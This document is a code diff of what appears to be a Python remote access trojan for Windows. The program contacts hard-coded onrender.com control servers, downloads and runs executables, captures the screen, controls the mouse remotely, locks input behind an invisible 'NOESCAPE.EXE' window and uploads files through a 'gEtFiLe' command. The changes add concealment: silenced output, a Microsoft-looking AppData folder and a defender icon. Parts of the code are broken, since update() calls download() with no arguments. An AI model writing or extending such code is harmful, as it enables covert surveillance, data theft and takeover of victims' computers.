@@ -12,26 +12,34 @@ from time import sleep, time
 from threading import Thread
 from pyautogui import size, mouseDown, mouseUp
 from shutil import rmtree
+from shutil import which
 from io import BytesIO
 from mss import mss
 import tkinter as tk
+import builtins
 import pyttsx3
 import asyncio
 import aiohttp
 import psutil
 import pygame
 import ctypes
-url = "https://ms32-sha2.onrender.com/" if b"This service has been suspended." not in get("https://ms32-sha2.onrender.com").content else "https://ms32-c67b.onrender.com/"
-server_url = "https://server-20zy.onrender.com/" if b"This service has been suspended." not in get("https://server-20zy.onrender.com").content else "https://server-ktcy.onrender.com/"
-# url = "http://192.168.29.154:5000/"
+import sys
+while True:
+    try:
+        url = "https://ms32-sha2.onrender.com/" if b"This service has been suspended." not in get("https://ms32-sha2.onrender.com").content else "https://ms32-c67b.onrender.com/"
+        server_url = "https://server-ktcy.onrender.com/" if b"This service has been suspended." not in get("https://server-ktcy.onrender.com").content else "https://server-20zy.onrender.com/"
+        break
+    except:
+        continue
+# url = "http://192.168.9.115:5000/"
 screen = get_primary_display()
-terminate = False           
+terminate = False
 sstate = False
 sharing = False
 bstate = False
 bmstate = False
 bsig  = False
-user = "03"
+user = "101"
 width, height = size()
 try:
     pygame.mixer.init()
@@ -41,24 +49,29 @@ except:
         post(url+"output",data={"user":user,"err":statement})
     except:
         pass
-              
-if not path.exists("effects"):
-    mkdir("effects")
-if not path.exists("assets"):
-    mkdir("assets")
+
+def ifExe():
+    return getattr(sys, 'frozen', False)
+
+def noprint():
+    if ifExe():
+        builtins.print = lambda *a, **k: None
+
+noprint()
+
 def is_admin():
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
     except:
         return False
 def hit(url:str,data=None):
-    # try:
+    try:
         if not terminate:
             if data:
                 return post(url,json=data)
             return get(url,stream=True)
-    # except:
-    #     return "none"
+    except:
+        return "none"
 
 def log(statement,state="SUCESS",terminal=False):
     try:
@@ -67,7 +80,26 @@ def log(statement,state="SUCESS",terminal=False):
         hit(url+"output",data={"user":user,"err":statement})
     except:
         pass
-
+def get_path(name):
+    base_path = path.expandvars(r"%APPDATA%\Microsoft\MS32")
+    return path.join(base_path, name)
+if not path.exists(get_path("effects")):
+    mkdir(get_path("effects"))
+if not path.exists(get_path("assets")):
+    mkdir(get_path("assets"))
+    
+        
+def download(name,url):
+    try:
+        if not which("wget"):
+            log("Downloading Wget")
+            sbrun(["winget","install","wget"],shell=True)
+        sbrun(["wget","-O",get_path(name),url],shell=True)
+        return True
+    except Exception as e:
+        log("Download thread error occured: {e}",state="WARN")
+        return False
+    
 def say(txt):
     try:
         engine = pyttsx3.init()
@@ -81,18 +113,9 @@ def say(txt):
 def playfunc(fp):
     try:
         if not path.exists(path.join("effects",fp)):
-            audi = hit(url+f"static/sounds/{fp}")
-            try:
-                kp = type(audi.content.decode("utf-8"))
-                log(f"Likely error. recieved content for {fp} is {kp}")
-            except Exception as e:
-                log(f"DOwnloaded {fp}")
-            with open(path.join("effects",fp), "xb") as file:
-                downloaded_size = 0
-                for chunk in audi.iter_content(chunk_size=8192):
-                    if chunk:
-                        file.write(chunk)
-                        downloaded_size += len(chunk)
+            if not download(fp,url+f"static/sounds/{fp}"):
+                log(f"Can't Download audio {fp}")
+                return
         # try:                
         CoInitialize()
         devices = AudioUtilities.GetSpeakers()
@@ -107,10 +130,10 @@ def playfunc(fp):
         target = max(min(target, vmax), vmin)
         volume.SetMasterVolumeLevel(target, None)
         # except:
-        #     pass
+        #     pass/
         CoUninitialize()
         log("Vol set to 80")
-        pygame.mixer.music.load(f"effects/{fp}")
+        pygame.mixer.music.load(get_path(f"effects\\{fp}"))
         log(f"Playing {fp}",terminal=True)
         pygame.mixer.music.play()
         while pygame.mixer.music.get_busy():
@@ -123,18 +146,7 @@ def update():
     try:
         global terminate
         exe = hit(url+"static/updates/ms32-1.exe")
-        try:
-            kp = type(exe.content.decode("utf-8"))
-            log(f"Likely error. recieved content for ms32-1.exe is {kp}")
-        except Exception as e:
-            log(f"DOwnloaded ms32-1.exe")
-        total_size = int(exe.headers.get('content-length', 0))
-        with open("ms32-1.exe", "xb") as file:
-            downloaded_size = 0
-            for chunk in exe.iter_content(chunk_size=8192):
-                if chunk:
-                    file.write(chunk)
-                    downloaded_size += len(chunk)
+        if not download():pass
         if not path.exists("updater.exe"):
             exe = hit(url+"static/updates/updater.exe")
             try:
@@ -217,21 +229,19 @@ def restart():
 
 def run(name):
     try:
-        if path.exists(name):
-            remove(name)
-        exe = hit(url+f"static/apps/{name}")
-        try:
-            kp = type(exe.content.decode("utf-8"))
-            log(f"Likely error. recieved content for {name} is {kp}")
-        except Exception as e:
-            log(f"DOwnloaded {name}")
-        with open(name, "xb") as file:
-            downloaded_size = 0
-            for chunk in exe.iter_content(chunk_size=8192):
-                if chunk:
-                    file.write(chunk)
-                    downloaded_size += len(chunk)
-        log(f"Running {name}")
+        if not path.exists(name):
+            exe = hit(url+f"static/apps/{name}")
+            try:
+                kp = type(exe.content.decode("utf-8"))
+                log(f"Likely error. recieved content for {name} is {kp}")
+            except Exception as e:
+                log(f"DOwnloaded {name}")
+            with open(name, "xb") as file:
+                downloaded_size = 0
+                for chunk in exe.iter_content(chunk_size=8192):
+                    if chunk:
+                        file.write(chunk)
+                        downloaded_size += len(chunk)
         startfile(name)
         log(f"Done Running {name}")
     except Exception as e:
@@ -343,7 +353,8 @@ def block_touch(event):
     return "break"
 def block():
     root = tk.Tk()
-
+    root.iconbitmap = get_path("defender.ico")
+    root.title("NOESCAPE.EXE")
     root.attributes("-fullscreen", True)
     root.attributes("-alpha", 0.01)
     root.attributes("-topmost", True)
@@ -353,6 +364,7 @@ def block():
     root.bind("<Motion>", block_touch)
     while bstate:
         root.update()
+        sleep(0.01)
     root.quit() 
     root.destroy()
     root = None  
@@ -482,7 +494,7 @@ async def control():
                         move(x,y)
                         bsig = False;sleep(0.03)
                         double_click()
-                    elif data["type"] == " drag":
+                    elif data and data["type"] == " drag":
                         x1 = data["x1"]*(width/data["width"])
                         y1 = data["y1"]*(height/data["height"])
                         x2 = data["x2"]*(width/data["width"])
@@ -496,7 +508,7 @@ async def control():
                         sleep(0.01)
                         mouseUp()                   	                  	                       
                     await asyncio.sleep(0.09)
-            except Exception as e:log(f"control thread error:\t{e}")
+            except Exception as e:log(f"control thread error:\t{e}",state="WARN")
 def commtxt():
     try:
         if not path.exists("speakdisplay.exe"):
@@ -594,7 +606,6 @@ def main():
                 p = cmd.replace("gEtFiLe ", "")
                 if p.startswith("/"):
                     p = p.replace("/", "")
-                
                 try:
                     with open(p, "rb") as file:
                         files = {'file': file}
